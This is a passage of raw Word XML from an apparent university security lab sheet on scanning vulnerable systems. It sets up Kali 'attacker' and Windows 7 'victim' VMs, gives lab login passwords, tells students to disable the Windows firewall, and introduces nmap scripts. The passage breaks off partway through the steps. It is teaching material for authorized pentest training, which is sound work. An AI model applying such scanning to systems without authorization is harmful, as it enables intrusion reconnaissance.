          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76247F96" w14:textId="713F85A4" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CF6D100" w14:textId="13BCC08C" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B3382A4" w14:textId="1227A7DF" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="165FC4C5" w14:textId="730C7A3A" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40B9F9E8" w14:textId="39B5166B" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7329D83E" w14:textId="2759A668" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35519C34" w14:textId="16E2481E" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01F5567B" w14:textId="3C036D46" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A83DFEF" w14:textId="6032CBEF" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17C6702F" w14:textId="32CA852E" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E6401D7" w14:textId="7DA75D8F" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18BD2998" w14:textId="2BF15C66" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65728706" w14:textId="75B2E671" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B3F6127" w14:textId="797F08C7" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1980C4FD" w14:textId="7C11D9C6" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53DC8627" w14:textId="4E135E82" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="581D80FC" w14:textId="7EEA22A1" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="773F6795" w14:textId="5675AAF3" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B2C14CD" w14:textId="6526E538" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20349327" w14:textId="1BFDF1AC" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="782D174B" w14:textId="74E380D8" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D2CE30" w14:textId="703CDAAE" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="699E3DD8" w14:textId="76B77263" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76AC47E2" w14:textId="4A4E961F" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43E20831" w14:textId="51610CFA" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="133BB01C" w14:textId="73DFDB1D" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DE5E989" w14:textId="283D0C4E" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="490DD697" w14:textId="32EE38EC" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="780A75F2" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRPr="00866775" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D2B6C11" w14:textId="4B39B14D" w:rsidR="009C188C" w:rsidRDefault="00814D14" w:rsidP="009C188C">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Scan vulnerable systems                             </w:t>
      </w:r>
      <w:r w:rsidR="007C4482">
        <w:t xml:space="preserve">         ___/2</w:t>
      </w:r>
      <w:r w:rsidR="000A0EAE">
        <w:t>0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DD7B81" w14:textId="77777777" w:rsidR="009C188C" w:rsidRDefault="009C188C" w:rsidP="009C188C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29F5A40B" w14:textId="77777777" w:rsidR="00D110C4" w:rsidRDefault="00D110C4" w:rsidP="00D110C4">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5672849F" w14:textId="28A600F5" w:rsidR="008907BC" w:rsidRDefault="008907BC" w:rsidP="008907BC">
      <w:r>
        <w:t xml:space="preserve">The objective of this exercise is to use </w:t>
      </w:r>
      <w:r w:rsidR="00BA1C8A">
        <w:t>Linux-Kali</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tools to scan target systems and </w:t>
      </w:r>
      <w:r w:rsidR="00506FE3">
        <w:t>identify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79415A09" w14:textId="77777777" w:rsidR="008907BC" w:rsidRDefault="008907BC" w:rsidP="008907BC"/>
    <w:p w14:paraId="1828F8B3" w14:textId="77777777" w:rsidR="008907BC" w:rsidRDefault="008907BC" w:rsidP="008907BC"/>
    <w:p w14:paraId="3E55175E" w14:textId="0DDA0403" w:rsidR="004A244E" w:rsidRPr="006F1499" w:rsidRDefault="004A244E" w:rsidP="004A244E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Download Kali virtual machine</w:t>
      </w:r>
      <w:r w:rsidR="00BA1C8A">
        <w:t xml:space="preserve"> K</w:t>
      </w:r>
      <w:r w:rsidR="00B76541">
        <w:t>ali2020</w:t>
      </w:r>
      <w:r w:rsidR="005D50C2">
        <w:t xml:space="preserve">  , </w:t>
      </w:r>
      <w:r>
        <w:t>Windows 7(</w:t>
      </w:r>
      <w:r w:rsidRPr="00B915A3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>64bits</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidR="005D50C2">
        <w:t xml:space="preserve">and Windows 10 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">from OneDrive. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616E52B4" w14:textId="42E4D032" w:rsidR="004A244E" w:rsidRDefault="004A244E" w:rsidP="004A244E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006F1499">
        <w:t>Set up the image</w:t>
      </w:r>
      <w:r w:rsidR="00BA1C8A">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="005B13C6">
        <w:t xml:space="preserve"> in VirtualBox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6067B043" w14:textId="77777777" w:rsidR="004A244E" w:rsidRDefault="004A244E" w:rsidP="004A244E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Create a snapshot or clone the VM when ready.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E1D143" w14:textId="77777777" w:rsidR="004A244E" w:rsidRDefault="004A244E" w:rsidP="004A244E"/>
    <w:p w14:paraId="66259F6D" w14:textId="77777777" w:rsidR="004A244E" w:rsidRDefault="004A244E" w:rsidP="004A244E">
      <w:pPr>
        <w:ind w:left="709"/>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D70101">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Note: Many lab exercises in this course will adversely affect the system. You should make use of the snapshot function in Virtua</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>lBox before you modify any important OS utilities or kernel functions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4602DAB7" w14:textId="77777777" w:rsidR="004A244E" w:rsidRPr="00D70101" w:rsidRDefault="004A244E" w:rsidP="004A244E">
      <w:pPr>
        <w:ind w:left="709"/>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60C678C1" w14:textId="234FE9AF" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>To connect Kali(Attacker) with Windows 7(Victim machine) do the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4936E713" w14:textId="39137E8C" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Start virtual box </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> click in File</w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> preferences </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Network and add (Activate) NATNetwork</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4BA708" w14:textId="77777777" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>For each virtual machine configure Network settings as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2353C3A9" w14:textId="77777777" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F85F77F" w14:textId="77777777" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40698275" wp14:editId="2ABE97D9">
            <wp:extent cx="5943600" cy="4529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inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31749975" w14:textId="77777777" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="612FDA92" w14:textId="77777777" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79C5AFF2" w14:textId="22F1121C" w:rsidR="00BA1C8A" w:rsidRPr="00BA1C8A" w:rsidRDefault="00B54DAE" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Start</w:t>
      </w:r>
      <w:r w:rsidR="00BA1C8A">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">virtual </w:t>
      </w:r>
      <w:r w:rsidR="00BA1C8A">
        <w:t xml:space="preserve">machines </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="00BA1C8A">
        <w:t>login as follows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462D34EF" w14:textId="3A131FC5" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">On Kali machine Login as: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>itscstudent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with password: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Attacker2020 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DC4ADA" w14:textId="2B44D23C" w:rsidR="00BA1C8A" w:rsidRPr="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA1C8A">
        <w:t>On Windows 7 login as</w:t>
      </w:r>
      <w:r w:rsidR="00B54DAE">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00B54DAE" w:rsidRPr="00506FE3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ITSCvictim2</w:t>
      </w:r>
      <w:r w:rsidR="00B54DAE">
        <w:t xml:space="preserve">  with password: </w:t>
      </w:r>
      <w:r w:rsidR="00B54DAE" w:rsidRPr="00506FE3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Victim2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE34734" w14:textId="77777777" w:rsidR="00B54DAE" w:rsidRDefault="00B54DAE" w:rsidP="00B54DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use the respective commands to verify IP address. The VMs should belong to the same Network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732F7E7D" w14:textId="77777777" w:rsidR="00B54DAE" w:rsidRPr="00FF21A4" w:rsidRDefault="00B54DAE" w:rsidP="00B54DAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Use the ping command to verify connectivity between virtual machines. If you are unable to ping check NAT settings and make sure firewall is disable in Windows virtual machine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F54879F" w14:textId="1D9822FD" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If needed update and upgrade </w:t>
      </w:r>
      <w:r w:rsidR="00B54DAE">
        <w:t xml:space="preserve">Kali </w:t>
      </w:r>
      <w:r w:rsidR="00506FE3">
        <w:t xml:space="preserve">virtual </w:t>
      </w:r>
      <w:r w:rsidR="00B54DAE">
        <w:t xml:space="preserve">machine </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">using the commands: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E3AD95" w14:textId="6829E8D9" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="00BA1C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1069"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="000C41DB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>apt update &amp;&amp;</w:t>
      </w:r>
      <w:r w:rsidRPr="00FF21A4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> apt upgrade –y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EEFA3E" w14:textId="77777777" w:rsidR="004A244E" w:rsidRDefault="004A244E" w:rsidP="004A244E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1069"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61D6C610" w14:textId="77777777" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="004A244E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1069"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07792F01" w14:textId="77777777" w:rsidR="00BA1C8A" w:rsidRDefault="00BA1C8A" w:rsidP="004A244E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1069"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70831701" w14:textId="77777777" w:rsidR="00506FE3" w:rsidRPr="00FF21A4" w:rsidRDefault="00506FE3" w:rsidP="004A244E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1069"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6474970D" w14:textId="77777777" w:rsidR="00BF1904" w:rsidRDefault="00BF1904" w:rsidP="00BF1904">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Pentest is an authorized simulated cyberattack to evaluate security of software and infrastructure. A Pentest can help to determine whether a system is vulnerable to attack if defenses were sufficient and which defenses the test defeated (if any).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D3AEC1" w14:textId="77777777" w:rsidR="00BF1904" w:rsidRDefault="00BF1904" w:rsidP="00BF1904">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EE40492" w14:textId="77777777" w:rsidR="00BF1904" w:rsidRDefault="00BF1904" w:rsidP="00BF1904">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first phase of Pentest is </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF1904">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>reconnaissance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF1904">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>scanning</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You will use nmap and zenmap tools to scan targeted system. nmap contains many scripts written in Lua language located in </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF1904">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/usr/share/nmap</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C79DE3F" w14:textId="77777777" w:rsidR="00BF1904" w:rsidRDefault="00BF1904" w:rsidP="00BF1904">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52038FBA" w14:textId="31690ADB" w:rsidR="002F4107" w:rsidRPr="002F4107" w:rsidRDefault="00887576" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To learn nmap usage access the following web site </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r w:rsidR="002F4107" w:rsidRPr="00BF1904">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:eastAsia="en-CA"/>
          </w:rPr>
          <w:t>https://nmap.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="002F4107" w:rsidRPr="0006153A">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="002F4107" w:rsidRPr="0006153A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E1472A" w14:textId="3826B88C" w:rsidR="008907BC" w:rsidRDefault="001239B7" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(3</w:t>
      </w:r>
      <w:r w:rsidR="0075785B" w:rsidRPr="0075785B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r w:rsidR="0075785B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00764E69" w:rsidRPr="00BF1904">
        <w:t>On Kali machine c</w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t>ha</w:t>
      </w:r>
      <w:r w:rsidR="00BF1904">
        <w:t xml:space="preserve">nge to </w:t>
      </w:r>
      <w:r w:rsidR="00BF1904" w:rsidRPr="00BF1904">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/usr/share/nmap/scripts</w:t>
